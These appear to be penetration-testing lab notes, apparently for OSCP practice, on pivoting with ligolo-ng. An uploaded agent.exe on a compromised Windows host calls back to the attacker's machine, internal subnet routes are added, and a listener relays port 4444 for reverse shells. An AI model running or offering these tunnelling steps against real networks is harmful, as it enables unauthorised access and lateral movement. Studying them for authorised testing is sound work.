Prerequisites

  • Upload agent.exe

Setup

┌──(kali㉿kali)-[~/utils/Windows]
└─$ sudo ip tuntap add user $(whoami) mode tun ligolo
┌──(kali㉿kali)-[~/utils/Windows]
└─$ sudo ip link set ligolo up
┌──(kali㉿kali)-[~/utils/Windows]
└─$ ip addr show ligolo

Start ligolo-ng

┌──(kali㉿kali)-[~/utils/Windows]
└─$ ligolo-proxy -selfcert -laddr 0.0.0.0:9001

On the target mechine

.\agent.exe -connect MY_IP:9001 -ignore-cert

Select Agent (Agent joined -> Enter "session" -> select session)

ligolo-ng » INFO[0195] Agent joined.                                 id=005056ab8bf5 name="OSCP\\eric.wallows@MS01" remote="192.168.115.147:59014"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - OSCP\eric.wallows@MS01 - 192.168.115.147:59014 - 005056ab8bf5
[Agent : OSCP\eric.wallows@MS01] »

Start session

[Agent : OSCP\eric.wallows@MS01] » tunnel_start --tun ligolo
INFO[0284] Starting tunnel to OSCP\eric.wallows@MS01 (005056ab8bf5)

Add tunnel

┌──(kali㉿kali)-[~/utils/Windows]
└─$ sudo ip route add XXX.XXX.XXX.0/24 dev ligolo # add TARGET_IP_RANGE
┌──(kali㉿kali)-[~/utils/Windows]
└─$ ip route | grep 10.10.75 
10.10.75.0/24 dev ligolo scope link

Create VIA tunnel

[Agent : OSCP\eric.wallows@MS01] » listener_add --addr JUNCTION_IP:4444 --to MY_IP:4444 --tcp
INFO[1301] Listener 0 created on remote agent!

Junction IP should be the subnet IP like 10.10.xxx.xxx (it must have it)
